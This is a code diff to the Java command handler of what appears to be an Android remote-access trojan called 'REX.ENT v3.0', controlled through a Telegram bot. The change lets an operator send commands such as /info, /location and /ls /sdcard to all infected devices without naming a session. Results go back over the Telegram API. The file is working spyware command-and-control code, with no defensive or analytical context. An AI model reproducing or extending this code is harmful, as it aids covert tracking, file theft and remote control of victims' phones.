@@ -43,23 +43,32 @@ public class CommandHandler {
 
     public void handleCommand(String text, long chatId, String messageId, JsonObject message) {
         String[] parts = text.trim().split("\\s+");
+        if (parts.length == 0) return;
         String cmd = parts[0].toLowerCase();
 
+        // Commands without session requirement
         if (cmd.equals("/start") || cmd.equals("/help")) {
             processGlobal(cmd);
             return;
         }
 
-        String target = null;
-        String[] realArgs;
+        // Extract target session (default: ALL)
+        String target = "ALL";
+        String[] realArgs = new String[0];
+
         if (parts.length >= 2) {
-            target = parts[1].toUpperCase();
-            realArgs = new String[parts.length - 2];
-            System.arraycopy(parts, 2, realArgs, 0, realArgs.length);
-        } else {
-            return;
+            String second = parts[1].toUpperCase();
+            if (second.startsWith("SESSION_") || second.equals("ALL")) {
+                target = second;
+                realArgs = new String[parts.length - 2];
+                System.arraycopy(parts, 2, realArgs, 0, realArgs.length);
+            } else {
+                realArgs = new String[parts.length - 1];
+                System.arraycopy(parts, 1, realArgs, 0, realArgs.length);
+            }
         }
 
+        // Check if this device is the intended recipient
         String mySession = BotConfig.SESSION_ID.toUpperCase();
         if (!target.equals("ALL") && !target.equals(mySession)) {
             return;
@@ -72,13 +81,12 @@ public class CommandHandler {
         if (cmd.equals("/start")) {
             TelegramApi.sendMessage("⚡ <b>REX.ENT v3.0 Online</b>\n" +
                 "<b>Session:</b> <code>" + BotConfig.SESSION_ID + "</code>\n\n" +
-                "Use <code>/cmd &lt;session&gt; &lt;args&gt;</code> to target a device.\n" +
-                "<code>/cmd " + BotConfig.SESSION_ID + " /info</code>");
+                "Commands work directly without session ID for single device.\n" +
+                "<code>/info</code>\n<code>/location</code>");
         } else {
-            TelegramApi.sendMessage("Format: <code>/command SESSION_XXXX [args]</code>\n" +
-                "Examples:\n" +
-                "<code>/info " + BotConfig.SESSION_ID + "</code>\n" +
-                "<code>/ls " + BotConfig.SESSION_ID + " /sdcard</code>");
+            TelegramApi.sendMessage("Format: <code>/command [args]</code>\n" +
+                "Target session optional. Default: ALL (this device).\n" +
+                "<code>/info</code>\n<code>/ls /sdcard</code>");
         }
     }
 
